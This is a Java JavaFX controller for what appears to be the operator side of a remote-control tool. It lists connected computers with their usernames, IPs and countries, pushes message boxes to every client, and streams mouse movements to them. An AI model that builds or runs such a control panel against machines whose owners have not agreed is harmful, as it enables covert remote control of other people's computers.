package controller;

import adama.SocketClient;
import adama.SocketServer;
import entity.Computer;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.scene.control.TableColumn;
import javafx.scene.control.TableView;
import javafx.scene.control.TextArea;
import javafx.scene.control.cell.PropertyValueFactory;
import javafx.scene.input.KeyCode;

import java.awt.*;
import java.net.URL;
import java.util.HashMap;
import java.util.ResourceBundle;

/**
 *
 */
public class ServerController implements Initializable {

    @FXML
    public TableColumn computerColumnUsername;

    @FXML
    public TableColumn computerColumnVersion;

    @FXML
    public TextArea messageText;

    @FXML
    public TableColumn<Computer, String> computerColumnCountry;

    @FXML
    public TableColumn<Computer, String> computerColumnIP;

    @FXML
    private TableView<Computer> computerTable;

    @FXML
    private TableColumn<Computer, String> computerColumnName;

    @FXML
    private javafx.scene.control.Button buttonMouveMouse;

    private SocketServer server;

    private boolean mouveMouse;

    private HashMap<String, Computer> computers;

    private SocketClient currentClient;

    public ServerController() {
    }

    @Override
    public void initialize(URL location, ResourceBundle resources) {
        assert computerTable != null;
        assert computerColumnIP != null;
        assert computerColumnName != null;
        assert computerColumnCountry != null;
        assert messageText != null;

        this.mouveMouse = false;
        this.computers = new HashMap<>();

        this.buttonMouveMouse.setOnMouseClicked(event -> {
            this.mouveMouse = !this.mouveMouse;
            if (this.mouveMouse) {
                this.buttonMouveMouse.setText("Stop");
            } else {
                this.buttonMouveMouse.setText("Active");
            }
        });

        this.computerColumnUsername.setCellValueFactory(
                new PropertyValueFactory<>("username")
        );

        this.computerColumnVersion.setCellValueFactory(
                new PropertyValueFactory<>("version")
        );

        this.computerColumnName.setCellValueFactory(
                new PropertyValueFactory<>("name")
        );

        this.computerColumnCountry.setCellValueFactory(
                new PropertyValueFactory<>("country")
        );

        this.computerColumnIP.setCellValueFactory(
                new PropertyValueFactory<>("ip")
        );
        this.messageText.setOnKeyPressed(event -> {
                    if (event.getCode().equals(KeyCode.ENTER)) {
                        server.getClients().forEach(client ->
                                client.emit(
                                        "message.box",
                                        messageText.getText().trim()
                                )
                        );
                    }
                }
        );

        this.initialiseServer(location, resources);
    }

    private void initialiseServer(URL location, ResourceBundle resources) {
        new Thread(
                () -> {
                    System.out.println("Running server  ......");
                    ServerController.this.server = new SocketServer(9000);

                    ServerController.this.server.addClientListener(client ->
                            new Thread(() -> {

                                while (true) {
                                    if (ServerController.this.mouveMouse) {
                                        client.emit(
                                                "mouse.move",
                                                MouseInfo.getPointerInfo().getLocation()
                                        );
                                    }
                                }
                            }).start()
                    );

                    ServerController.this.server.addClientListener(client ->
                            client.on(
                                    "computer.information",
                                    computer -> computerTable.getItems().add((Computer) computer)
                            )
                    );

                    ServerController.this.server.start();
                }
        ).start();
    }
}
